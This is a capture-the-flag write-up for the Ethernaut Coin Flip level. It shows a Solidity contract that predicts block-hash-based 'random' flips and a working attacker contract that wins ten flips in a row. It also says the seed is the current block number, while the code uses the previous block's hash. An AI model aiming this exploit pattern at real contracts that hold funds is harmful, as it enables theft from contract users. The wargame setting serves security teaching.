## Ethernaut Level 03 - Coin Flip - Write-Up
<!--Authors: OofedUp-->

Difficulty: 3/10

![image](https://i.imgur.com/B9qJ1sF.png)

## Source
```javascript
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

The goal of this level was to predict 10 coin flips in a row, which are "random", but as we all know, there is no randomness in a blockchain. These kinds of vulnerabilities are called *Entropy Illusion* because something random on the blockchain is truly an illusion.

## Entropy Illusion
The seed of the random algorithm implemented in the smart contract is the current block's number. We can create another smart contract in [Remix](https://remix.ethereum.org) which calculates these "random" values and submits them to the original contract.

Here's the malicious contract that I have created in order to succesfully predict 10 coin flips:

```javascript
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract EntropyIllusion {
    CoinFlip public main;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    uint256 lastHash;

    function EntropyIllusion(){
        main = CoinFlip(INSTANCE ADDR);
    }

    function hack() public returns (bool){
          uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    main.flip(side);
    return true;
    }

}
```

You just need to call the `EntropyIllusion.hack()` function 10 times and that's it (in my experience the contract sometimes errored out, but just keep going and make sure you check the current streak on the vulnerable contract).

We can check the number of correct flips in a row using this command:

```javascript
contract.consecutiveWins()
```

After we have 10 correct flips, we can submit the contract:

![image](https://i.imgur.com/5g8g6iD.png)
